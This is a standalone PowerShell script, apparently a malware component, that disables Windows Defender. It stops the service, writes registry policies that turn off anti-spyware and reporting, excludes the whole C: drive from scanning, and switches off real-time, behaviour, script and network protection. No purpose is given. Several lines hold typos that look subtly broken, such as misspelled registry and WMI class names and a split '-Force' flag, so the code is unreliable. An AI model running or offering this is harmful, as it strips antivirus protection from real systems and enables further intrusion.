function randomText {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}

try {
    Get-Service WinDefend | Stop-Service -Force
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSer\services\WinDefend" -Name "Start" -Value 4 -Type DWORD -Force
} catch {
    Write-Warning "Failed to disable WinDefend service"
}

try {
    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft" -Name "Windows Defender" -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD - Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1 -PropertyType DWORD - Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SpyNetReporting" -Value 1 -PropertyType DWORD - Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 1 -PropertyType DWORD - Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM\SOFTWARE\Policies\Microsoft\MRT" -Name "DontReportInfectionInformation" -Value 1 -PropertyType DWORD - Force -ea 0 | Out-Null
    if (-Not ((Get-WmiObject -class Win32_OperationSystem).Version -eq "6.1.7601")) {
        Add-MpPreference -ExclusionPath "C:\" -Force -ea 0 | Out-Null
        Set-MpPreference -DisableArchiveScanning $true -ea 0 | Out-Null
        Set-MpPreference -DisableBehaviorMonitoring $true -ea 0 | Out-Null
        Set-MpPreference -DisableBlockAtFirstSeen $true -ea 0 | Out-Null
        Set-MpPreference -DisableCatchupFullScan $true -ea 0 | Out-Null
        Set-MpPreference -DisableCatchupQuickScan $true -ea 0 | Out-Null
        Set-MpPreference -DisableIntrusionPreventionSystem $true -ea 0 | Out-Null
        Set-MpPreference -DisableIOAVProtection $true -ea 0 | Out-Null
        Set-MpPreference -DisableRealtimeMonitoring $true -ea 0 | Out-Null
        Set-MpPreference -DisableRemoveableDriveScanning $true -ea 0 | Out-Null
        Set-MpPreference -DisableRestorePoint $true -ea 0 | Out-Null
        Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true -ea 0 | Out-Null
        Set-MpPreference -DisableScanningNetworkFiles $true -ea 0 | Out-Null
        Set-MpPreference -DisableScriptScanning $true -ea 0 | Out-Null
        Set-MpPreference -EnableControlledFolderAccess Disabled -Force -ea 0 | Out-Null
        Set-MpPreference -EnableNetworkProtection AuditMode -Force -ea 0 | Out-Null
        Set-MpPreference -MAPSReporting Disabled -Force -ea 0 | Out-Null
        Set-MpPreference -SubmitSamplesConsent NeverSend -Force -ea 0 | Out-Null
        Set-MpPreference -PUAProtection Disabled -Force -ea 0 | Out-Null
    }
} catch {
    Write-Warning "Failed to disable Windows Defender"
}